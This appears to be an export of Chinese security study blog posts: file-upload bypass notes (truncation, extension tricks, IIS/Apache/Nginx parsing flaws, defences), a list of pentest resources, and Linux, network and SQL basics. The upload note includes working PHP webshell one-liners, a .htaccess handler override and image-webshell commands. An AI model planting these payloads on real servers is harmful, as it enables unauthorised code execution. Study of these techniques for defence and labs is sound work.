    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>对文件上传的一个笔记总结。</p>
<a id="more"></a>

<h2 id="前言-amp-amp-参考"><a href="#前言-amp-amp-参考" class="headerlink" title="前言&amp;&amp;参考"></a>前言&amp;&amp;参考</h2><p>参考链接:</p>
<ul>
<li><a href="https://zhaijiahui.github.io/2019/01/28/upload-labs/" title="" target="">Upload-lab练习</a></li>
<li><a href="https://fuping.site/2018/06/04/upload-labs-writeup/" title="" target="">fuping-upload-labs writeup</a></li>
<li><a href="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="" target="">Misaki&#39;s 文件上传漏洞</a></li>
<li><a href="https://xz.aliyun.com/t/6047" title="" target="">先知社区-浅谈常见的文件上传的检测方式与绕过方法</a></li>
<li><a href="https://xz.aliyun.com/t/4029#toc-13" title="" target="">先知社区-Upload-labs 20关通关笔记</a></li>
<li><a href="https://www.anquanke.com/post/id/166616#h2-0" title="" target="">安全客-部分中间件漏洞总结</a></li>
<li><a href="https://blog.csdn.net/baidu_36847344/article/details/62416662" title="" target="">文件上传漏洞是什么？要怎样防御文件上传的漏洞攻击？</a>

</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/20190527142723-7cd5273c-8048-1.png" alt="漏洞上传"></p>
<h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><p>前端限制是最不靠谱的限制办法。<br>解决办法:</p>
<ul>
<li>html页面删除检测javascript检测函数</li>
<li>禁用javascript脚本</li>
<li>先将恶意脚本后缀改为前端脚本允许的后缀。然后抓包再修改为php/asp等</li>
</ul>
<h2 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h2><p>后端限制方式较多，有检测后缀黑名单和白名单，检测内容等。</p>
<h3 id="检查后缀黑名单"><a href="#检查后缀黑名单" class="headerlink" title="检查后缀黑名单"></a>检查后缀黑名单</h3><h4 id="上传特殊可解析后缀"><a href="#上传特殊可解析后缀" class="headerlink" title="上传特殊可解析后缀"></a>上传特殊可解析后缀</h4><p>php5 phtml等，但<strong>前提是要目标服务器有相应的配置才行</strong>。</p>
<h4 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传<code>.htaccess</code></h4><p>适用于:Apache服务器</p>
<p>前提:</p>
<ol>
<li>要求目标服务器，没有将.htaccess加入为黑名单。</li>
<li>要求服务器不将上传文件重命名。</li>
</ol>
<p>限制较多，能用的场景较少。。</p>
<p>Nginx应该也可以使用，但前提是要求服务器有做相应的配置。例如：<a href="https://www.jb51.net/article/69220.htm" title="" target="">使Nginx服务器支持.htaccess的方法</a>，不过服务器做什么配置，不是由我们说了算的啊，还是鸡肋。</p>
<p><code>.htaccess</code>内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
<p>将所有类型的文件，都可以当成php文件解析。</p>
<h4 id="后缀大小写、加空格、加点绕过"><a href="#后缀大小写、加空格、加点绕过" class="headerlink" title="后缀大小写、加空格、加点绕过"></a>后缀大小写、加空格、加点绕过</h4><p>当服务器没有对后缀大小写、空格、<code>.</code>进行过滤时，可以使用。因为windows会忽略文件末尾的.和空格。</p>
<p>例如<code>shell.php</code>改名成</p>
<ul>
<li>shell.pHp</li>
<li>shell.php &lt;这里有个空格</li>
<li>shell.php. 加多一个点</li>
<li>shell.php. . 多加一个空格和点（如果服务器只校验一次。</li>
<li>shell.php. .点空格和上面一致</li>
</ul>
<h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><p>::$DATA文件流绕过(<strong>仅限Windows</strong>)</p>
<blockquote>
<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p>
</blockquote>
<p>所有当上传<code>shell.php::$DATA</code>，服务器实际上上传之后保存的文件名是<code>shell.php</code>而不是<code>shell.php::$data</code>。</p>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>如果目标服务器会将上传文件的敏感后缀名去空，那就可以考虑双写绕过。</p>
<p><code>.pphphp</code></p>
<h3 id="检测后缀白名单"><a href="#检测后缀白名单" class="headerlink" title="检测后缀白名单"></a>检测后缀白名单</h3><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>抓包修改MIME类型为允许的类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jpg- image&#x2F;jpeg</span><br><span class="line">png- image&#x2F;png</span><br></pre></td></tr></table></figure>
<p>等等。。</p>
<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>00截断是利用了php的一个漏洞。漏洞编号为<code>CVE-2015-2348</code>。使用前提要求较为严格。</p>
<ol>
<li>服务器<code>php</code>版本小于<code>5.3</code></li>
<li>魔术引号<code>gpc</code>处于关闭状态,没有使用转义函数</li>
<li>要求上传路径可控</li>
</ol>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200522_133449.jpg" alt="%00"></p>
<p>这个上传路径是通过<code>GET</code>型去传值的，直接在URL中显示。所以使用url编码的<code>%00</code>对其进行截断。</p>
<h4 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h4><p><code>0x00</code>截断和<code>%00</code>截断一样的，只不过区别在与<code>0x00</code>是用与上传路径为POST型的时候。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200522_134019.jpg" alt=""></p>
<p>在<code>../upload/</code>后面写<code>shell2.php+</code>文件名随意，<code>+</code>在16进制中代表<code>0x2b</code>方便我们在hex显示时，对其进行定位修改。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200522_134244.jpg" alt=""></p>
<p>将在hex显示的值中<code>2b</code>修改为<code>00</code>，改好之后会发现其实没什么区别。只是将+号去掉了的样子。但是发送包后会发现是上传成功的。</p>
<p>上传后的文件名，会发现有一个特殊符号，这就是我们的<code>0x00</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200522_134514.jpg" alt=""></p>
<p>对其进行蚁剑/菜刀等进行连接时文件名只取<code>%00/0x00</code>之前的字符。</p>
<h3 id="检测文件内容"><a href="#检测文件内容" class="headerlink" title="检测文件内容"></a>检测文件内容</h3><h4 id="文件头检查-file-magic-number"><a href="#文件头检查-file-magic-number" class="headerlink" title="文件头检查(file magic number)"></a>文件头检查(file magic number)</h4><a href="https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5" title="" target="">file magic number</a>好像是国外的说法，国内大部分好像都是直接说改文件头?

<p>如果只检查文件的前几个字节。那就直接添加图片的文件头信息就好了。</p>
<p>添加gif89a，改成其他的也行。不过gif89a好记。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200522_135302.jpg" alt=""></p>
<a href="https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5" title="" target="">常见文件头类型</a>

<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>二次渲染会将上传后的图片马重新压缩一次，会将原有的php代码消除。</p>
<p>绕过思路：需要用一张GIF图，生成一个图片马后，上传成功后下载下来，与原来的图片马进行HEX对比，找到相同的地方，在那里插入一句话。（用GIF是因为GIF比JPG和PNG容易。</p>
<h2 id="中间件文件解析漏洞"><a href="#中间件文件解析漏洞" class="headerlink" title="中间件文件解析漏洞"></a>中间件文件解析漏洞</h2><p>可以通过观察IIS版本来猜测大概的系统版本</p>
<p>IIS版本</p>
<ul>
<li>IIS6.0 2003</li>
<li>IIS7.0/7.5 2008</li>
<li>IIS8.0-8.5 2012</li>
<li>IIS10 2016</li>
</ul>
<h3 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>目录解析，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建了一个目录<code>xx.asp</code>那么可以上传一个图片马。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;xx.asp&#x2F;shell.jpg</span><br></pre></td></tr></table></figure>

<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>在IIS6.0下，分号后面的不被解析。<br>上传一个文件shell.asp;.jpg。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell.asp;.jpg</span><br></pre></td></tr></table></figure>

<p>因为分号后面的IIS不会识别，所以就会被解析成<code>shell.asp</code></p>
<blockquote>
<p>IIS6.0中 asa,cer,cdx也能被当成asp解析</p>
</blockquote>
<h3 id="IIS-7-0-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/7.5/Nginx &lt;8.03畸形解析漏洞"></a>IIS 7.0/7.5/Nginx &lt;8.03畸形解析漏洞</h3><p>好像在apache中也会？</p>
<p>在默认Fast-CGI开启状况下,上传一个图片马shell.jpg，内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fwrite(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[a])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后访问shell.jpg/.php,在这个目录下就会生成一句话木马<code>shell.php</code></p>
<h3 id="Apache文件解析漏洞"><a href="#Apache文件解析漏洞" class="headerlink" title="Apache文件解析漏洞"></a>Apache文件解析漏洞</h3><p>Apache从右向左去读文件后缀，不认识的后缀会丢掉。<br>假设有一个文件名为<code>shell.php.zxc.wwc</code>后面两种不认识会被舍弃掉，所以就会被识别成<code>shell.php</code>。</p>
<h3 id="Apache多后缀解析后缀"><a href="#Apache多后缀解析后缀" class="headerlink" title="Apache多后缀解析后缀"></a>Apache多后缀解析后缀</h3><p>Apache Httpd支持一个文件拥有多个后缀,不同的后缀执行不同的命令,也就是说当我们上传的文件中只要后缀名含有php,该文件就可以被解析成php文件,利用Apache httpd这个特性,就可以绕过上传文件的白名单。<br>属于管理员配置不当造成的漏洞。如果上传<code>shell.php.jpg</code>的话将会被apache识别成<code>shell.php</code></p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ol>
<li>apache配置文件，禁止.php.这样的文件执行 禁止.php文件执行</li>
<li>使用SetHandler,写好正则 </li>
</ol>
<h3 id="FCK文件编辑器漏洞"><a href="#FCK文件编辑器漏洞" class="headerlink" title="FCK文件编辑器漏洞"></a>FCK文件编辑器漏洞</h3><p>FCK文件编辑器漏洞2.4.3/2.6.2这里都是用了IIS6.0的解析漏洞。而且FCK文件编辑器的上传路径是可控的。所以很简单的就可以利用成功了。</p>
<h2 id="生成图片马"><a href="#生成图片马" class="headerlink" title="生成图片马"></a>生成图片马</h2><h3 id="cmd-生成图片马"><a href="#cmd-生成图片马" class="headerlink" title="cmd 生成图片马"></a>cmd 生成图片马</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg</span><br></pre></td></tr></table></figure>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;?php eval($_POST[a])?&gt;&#39; &gt; 1.jpg</span><br></pre></td></tr></table></figure>

<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>文件上传漏洞防御方式:</p>
<ul>
<li>上传目录禁止执行，浏览权限</li>
<li>判断文件类型（最好白名单</li>
<li>使用随机数改写文件名和文件路径</li>
<li>单独设置文件服务器</li>
<li>二次渲染图片</li>
<li>及时更新中间件</li>
<li>关闭不必要的配置如nginx的畸形解析漏洞中的Fast-cgi</li>
<li>只允许访问特定类型的文件</li>
<li>指定特定扩展名的文件的处理方式，如.py,.php,.asp用纯文本明文显示。<code>AddType text/plain .py .php</code></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>upload</tag>
        <tag>nginx-upload</tag>
        <tag>iis-upload</tag>
        <tag>apache-upload</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透知识汇总</title>
    <url>/2020/04/14/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><hr>
<blockquote>
<p>本文不定时更新<br>主要为收集与渗透有关的教程，笔记，文章。</p>
</blockquote>
<hr>
<a id="more"></a>

<h1 id="统览"><a href="#统览" class="headerlink" title="统览"></a>统览</h1><p><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/" target="_blank" rel="noopener">Total OSCP Guide</a></p>
<a href="/2020/04/16/Penetration-Test-Steps/" title="渗透测试步骤们">渗透测试步骤们</a>

<h1 id="常用网页"><a href="#常用网页" class="headerlink" title="常用网页"></a>常用网页</h1><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit_database</a><br><a href="https://nvd.nist.gov/vuln/search" target="_blank" rel="noopener">NVD-Search</a><br><a href="https://cve.mitre.org/" target="_blank" rel="noopener">CVE</a><br><a href="https://support.offensive-security.com/oscp-exam-guide/" target="_blank" rel="noopener">OSCP</a></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><a href="/2020/04/14/NMAP%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8C%97/" title="NMAP快速指北">NMAP快速指北</a>

<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">cmd上传文件的几种方式</a><br><a href="https://www.jianshu.com/p/afb1e7b8acaf" target="_blank" rel="noopener">cmd下载文件</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34607586" target="_blank" rel="noopener">windows提权-系统信息收集</a></p>
<p><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" target="_blank" rel="noopener">systemctl绕过</a></p>
<p><a href="/2020/04/14/Linux提权方式/">Linux提权</a><br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a><br><a href="https://github.com/mzfr/gtfo" target="_blank" rel="noopener">GTFO</a></p>
<p>生成pty shell<br><a href="https://netsec.ws/?p=337" target="_blank" rel="noopener">spawn-pty-shell</a></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><a href="https://github.com/zhzyker/exphub" target="_blank" rel="noopener">zhzyker/漏洞利用脚本库</a></p>
<h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><p><a href="https://osintframework.com/" target="_blank" rel="noopener">OSINT_Framework_公开情报框架</a></p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">scannerbox</a><br><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="noopener">反弹shell</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">反弹shell-2</a><br><a href="https://www.httrack.com/page/2/en/index.html" target="_blank" rel="noopener">httrack用于爬取网页</a><br><a href="https://github.com/csvoss/onelinerizer" target="_blank" rel="noopener">onelinerizer</a></p>
<ul>
<li>将正常的python2代码转换为匿名函数(lamba)的代码。也许能在写payload的时候用?</li>
</ul>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>nmap</li>
<li>smbmap smb信息枚举</li>
</ul>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><ul>
<li><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">OneForAll</a></li>
</ul>
<h2 id="网站路径探测"><a href="#网站路径探测" class="headerlink" title="网站路径探测"></a>网站路径探测</h2><ul>
<li><a href="https://github.com/OJ/gobuster/releases" target="_blank" rel="noopener">gobuster</a> </li>
<li>dirb</li>
<li>dribuster</li>
</ul>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ul>
<li>nikto</li>
<li>nessus</li>
</ul>
<h2 id="监控服务"><a href="#监控服务" class="headerlink" title="监控服务"></a>监控服务</h2><ul>
<li>pspy</li>
</ul>
<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><ul>
<li>John</li>
<li>hydra</li>
<li>hashcat</li>
</ul>
<h2 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h2><ul>
<li>binwalk</li>
<li>steghide</li>
<li>stegsolve</li>
<li>stegoveritas</li>
<li>winhex</li>
<li>hexdump</li>
<li>exiftool</li>
<li>zsteg</li>
<li>imagemagic</li>
</ul>
<h2 id="音频分析"><a href="#音频分析" class="headerlink" title="音频分析"></a>音频分析</h2><ul>
<li>spectrogram</li>
</ul>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><ul>
<li>Ghidra (NSA的逆向工具)</li>
<li>IDA</li>
<li>r2</li>
<li>gdb</li>
</ul>
<h4 id="论坛-群组"><a href="#论坛-群组" class="headerlink" title="论坛/群组"></a>论坛/群组</h4><p>以下仅为TG聊天群组。</p>
<ul>
<li><a href="https://t.me/hackerzh" target="_blank" rel="noopener">Kali 中文交流</a></li>
<li><a href="https://t.me/xcsaofficial" target="_blank" rel="noopener">XCSA Linux</a></li>
<li><a href="https://t.me/linuxsecuritygroup" target="_blank" rel="noopener">LINUX, Security &amp; Programming</a></li>
<li><a href="https://t.me/HackTheBox_Training" target="_blank" rel="noopener">HackTheBox_Training</a></li>
<li><a href="https://t.me/BugCrowdChat" target="_blank" rel="noopener">Bug Huter Chat</a></li>
</ul>
<h4 id="练习靶场"><a href="#练习靶场" class="headerlink" title="练习靶场"></a>练习靶场</h4><ul>
<li><a href="https://tryhackme.com/" target="_blank" rel="noopener">Tryhackme</a></li>
<li><a href="https://www.hacking-lab.com/index.html" target="_blank" rel="noopener">Hacking-Lab</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
  </entry>
  <entry>
    <title>笔记</title>
    <url>/2020/04/24/%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>主要是这段时间的一些笔记总结。</p>
<a id="more"></a>

<h1 id="A级别-重要知识点"><a href="#A级别-重要知识点" class="headerlink" title="A级别:重要知识点"></a>A级别:重要知识点</h1><h2 id="一、虚拟机："><a href="#一、虚拟机：" class="headerlink" title="一、虚拟机："></a>一、虚拟机：</h2><h3 id="1-三种网络模式："><a href="#1-三种网络模式：" class="headerlink" title="1.三种网络模式："></a>1.三种网络模式：</h3><p>桥接<br>NAT<br>仅主机模式</p>
<h2 id="二、Linux"><a href="#二、Linux" class="headerlink" title="二、Linux"></a>二、Linux</h2><h3 id="1-运行级别：init"><a href="#1-运行级别：init" class="headerlink" title="1.运行级别：init"></a>1.运行级别：init</h3><ul>
<li><strong>运行级别0</strong>：系统关机状态，系统默认运行级别不能设为0，否则不能正常启动</li>
<li>运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆</li>
<li>运行级别2：多用户状态(没有NFS)</li>
<li>运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式</li>
<li>运行级别4：系统未使用，保留</li>
<li>运行级别5：X11控制台，登陆后进入图形GUI模式</li>
<li><strong>运行级别6</strong>：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</li>
</ul>
<p>如果需要永久切换运行级别，需要在配置文件中修改</p>
<h3 id="2-Linux目录结构"><a href="#2-Linux目录结构" class="headerlink" title="2.Linux目录结构"></a>2.Linux目录结构</h3><ul>
<li>/bin：bin是Binary的缩写, 这个目录存放着最经常使用的命令。</li>
<li>/sbin：s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。</li>
<li>/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。</li>
<li>/home：普通用户的主目录</li>
<li>/root：该目录为系统管理员，也称作超级权限者的用户主目录。</li>
<li>/tmp：这个目录是用来存放一些临时文件的。（重要主要体现在权限上）</li>
</ul>
<h3 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3.常用命令"></a>3.常用命令</h3><p>绝对路径  参照根目录<br>相对路径  参照当前目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;    当前路径       ..&#x2F;    上一层路径 </span><br><span class="line">ls -la    查看文件</span><br><span class="line">man     帮助</span><br><span class="line">ctrl + c   强制终止</span><br><span class="line">touch    创建文件</span><br><span class="line">mkdir    创建目录</span><br><span class="line">rm -fr    删除文件&#x2F;目录</span><br><span class="line">pwd      查看当前所在路径</span><br><span class="line">cp       复制</span><br><span class="line">mv       移动</span><br><span class="line">cat       读取文件内容</span><br><span class="line">head     从头开始读取文件内容</span><br><span class="line">tail       从尾部开始读取文件内容</span><br><span class="line">more     读取文件内容</span><br><span class="line">less       读取文件内容</span><br><span class="line">chmod 777 文件名   （read:4、write:2、excute:1）  给文件赋权限</span><br><span class="line">useradd 选项 用户名   创建账号</span><br><span class="line">userdel 选项 用户名    删除账号</span><br><span class="line">usermod 选项 用户名   修改账号</span><br><span class="line">groupadd 【选项】 用户组   添加用户组 </span><br><span class="line">groupdel 用户组             删除用户组</span><br><span class="line">groupmod 选项 用户组      修改用户组属性</span><br><span class="line">apt-get install xxxx      安装软件</span><br><span class="line">tar -zxvf xxxx.tar.gz      解压</span><br><span class="line">tar -cxvf xxxx.tar.gz      压缩</span><br><span class="line">whoami         查看当前登录用户</span><br><span class="line">history          查看历史命令</span><br><span class="line">|                管道符，前面的输出是后面的输入</span><br><span class="line">id               查看当前用户ID情况       </span><br><span class="line">find -name      按文件名字查找</span><br><span class="line">find -type f&#x2F;d    按文件类型查找</span><br><span class="line">ps -ef           查看进程</span><br><span class="line">service 服务名 start&#x2F;stop&#x2F;restart&#x2F;status     开启&#x2F;关闭&#x2F;重启&#x2F;查看 服务</span><br><span class="line">kill -9           强制终止进程</span><br><span class="line">ifconfig          查看IP地址</span><br><span class="line">uname           查看内核信息</span><br><span class="line">netstat -ntlp      查看网络状态</span><br></pre></td></tr></table></figure>
<h3 id="4-重要系统文件"><a href="#4-重要系统文件" class="headerlink" title="4.重要系统文件"></a>4.重要系统文件</h3><p><code>/etc/passwd</code>：存储用户信息</p>
<p><code>/etc/shadow</code>：存储加密后的密码</p>
<p><code>/etc/group</code>： 用户组相关信息</p>
<h3 id="5-vim"><a href="#5-vim" class="headerlink" title="5.vim"></a>5.vim</h3><h2 id="三、网络基础"><a href="#三、网络基础" class="headerlink" title="三、网络基础"></a>三、网络基础</h2><h3 id="1-IP"><a href="#1-IP" class="headerlink" title="1.IP"></a>1.IP</h3><p>IP地址是32位二进制数。<br>二进制和十进制的转换。<br>局域网地址：以10、172、192开头的三类地址，主要应用在采用TCP/IP协议互联单位局域网或校园网络内部。 （有可能是，不是一定是）  </p>
<h3 id="2-子网掩码"><a href="#2-子网掩码" class="headerlink" title="2.子网掩码"></a>2.子网掩码</h3><p>子网掩码的作用是将某个IP地址划分成网络地址和主机地址。必须和IP地址同时使用。<br>判断两个主机IP是否在一个子网：将两个IP同时和子网掩码进行与运算，如果所得结果相同，则处于同一个子网。<br>子网掩码1代表网络位，0代表主机位，1和0不能交叉出现。</p>
<h3 id="3-网关"><a href="#3-网关" class="headerlink" title="3.网关"></a>3.网关</h3><p>网关（Gateway）就是一个网络连接到另一个网络的“关口”<br>网关是和其他网络进行通信的出口，如果子网内的主机通信，可以不配置网关。</p>
<h3 id="4-通信子网和资源子网"><a href="#4-通信子网和资源子网" class="headerlink" title="4. 通信子网和资源子网"></a>4. 通信子网和资源子网</h3><p>功能上将计算机网络逻辑划分为<code>资源子网</code>和<code>通信子网</code>。</p>
<p>对于TCP/IP五层协议来说：</p>
<blockquote>
<p>其中资源子网为：应用层，传输层。<br>通信子网为：网络层、数据链路层、物理层。</p>
</blockquote>
<h3 id="5-OSI参考模型"><a href="#5-OSI参考模型" class="headerlink" title="5.OSI参考模型"></a>5.OSI参考模型</h3><table>
<thead>
<tr>
<th>OSI七层</th>
</tr>
</thead>
<tbody><tr>
<td>应用层</td>
</tr>
<tr>
<td>表示层</td>
</tr>
<tr>
<td>会话层</td>
</tr>
<tr>
<td>传输层</td>
</tr>
<tr>
<td>网络层</td>
</tr>
<tr>
<td>数据链路层</td>
</tr>
<tr>
<td>物理层</td>
</tr>
</tbody></table>
<h3 id="6-TCP-IP参考模型"><a href="#6-TCP-IP参考模型" class="headerlink" title="6.TCP/IP参考模型"></a>6.TCP/IP参考模型</h3><table>
<thead>
<tr>
<th>TCP五层</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>应用层</td>
<td>QQ，微信等应用软件</td>
</tr>
<tr>
<td>传输层</td>
<td>封装源端口和目的端口信息     TCP/UDP协议</td>
</tr>
<tr>
<td>网络层</td>
<td>封装源IP和目标IP信息        IP协议</td>
</tr>
<tr>
<td>数据链路层</td>
<td>封装mac地址信息</td>
</tr>
<tr>
<td>物理层</td>
<td></td>
</tr>
</tbody></table>
<h2 id="四、数据库"><a href="#四、数据库" class="headerlink" title="四、数据库"></a>四、数据库</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类"></a>1.分类</h3><p>关系型数据库和非关系型数据库</p>
<p>关系型数据库：MSSQL 、MySQL 、Access及其他常见数据库均为关系型数据库 </p>
<h3 id="2-特点"><a href="#2-特点" class="headerlink" title="2.特点"></a>2.特点</h3><p>(1)、Mysql是一种开源免费的数据库产品<br>(2)、Mysql对PHP的支持是最好（WAMP或者LAMP）<br>(3). Mysql是一种C/S结构：客户端和服务端</p>
<h3 id="3-数据库连接及退出"><a href="#3-数据库连接及退出" class="headerlink" title="3.数据库连接及退出"></a>3.数据库连接及退出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql.exe&#x2F;mysql    [-h主机地址]   [-P端口]   -u用户名    -p密码</span><br></pre></td></tr></table></figure>
<p>注意事项</p>
<ol>
<li>通常端口都可以默认：mysql坚挺的端口通常都是3306</li>
<li>密码的输入可以先输入-p，直接换行，然后再以密文方式输入密码</li>
<li>参数和值之间连这些不加空格</li>
</ol>
<p>退出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exit;		</span><br><span class="line">\q;		</span><br><span class="line">quit；</span><br></pre></td></tr></table></figure>
<h3 id="4-常见数据库命令"><a href="#4-常见数据库命令" class="headerlink" title="4.常见数据库命令"></a>4.常见数据库命令</h3><p><code>create database</code>                    创建数据库</p>
<p><code>create table</code> 表名(字段名 字段类型 [字段属性], 字段名 字段类型 [字段属性],…) [表选项]     创建数据表</p>
<p><code>show databases;</code>                   显示全部数据库</p>
<p><code>show tables;</code>                    显示全部数据表</p>
<p><code>show create database</code>数据库名字;   显示数据库创建语句</p>
<p><code>show create table</code>表名;             显示表创建语句</p>
<p><code>use</code> 数据库名字[;]                  选择数据库/进入数据库</p>
<p><code>drop database</code> 数据库名字;          删除数据库</p>
<p><code>drop table</code> 表名[,表名2…]；         可以同时删除多个数据表</p>
<p>数据库名.数据表<br><code>create table</code> 新表名 <code>like</code> 表名       复制表结构（仅仅复制结构不复制数据）</p>
<p><code>desc</code> 表名;                        显示表结构</p>
<p><code>rename table</code> 旧表名 <code>to</code> 新表名     修改表名</p>
<p><code>update</code> 表名 <code>set</code> 字段名 = 新值 [where 条件];   更新数据</p>
<p><code>select</code> 字段列表<code>/* from</code> 表名 <code>where</code> 字段名 = 值;   查询。*代表所有字段。<br><code>set names</code> 字符集</p>
<h3 id="5-SQL注入相关重点内容"><a href="#5-SQL注入相关重点内容" class="headerlink" title="5.SQL注入相关重点内容"></a>5.SQL注入相关重点内容</h3><p>1.<code>group_concat()</code>   为了将分组中指定的字段进行合并（字符串拼接）</p>
<p>2.<code>order by</code>排序：根据校对规则对数据进行排序，在SQL注入中用来判断查询字段数。</p>
<p>3.<code>limit 1</code> 限制查询结果返回1条     <code>limit 0,1</code>   限制获取结果为第一条记录，0代表第一条记录开始取，1代表获取的数量是一条  </p>
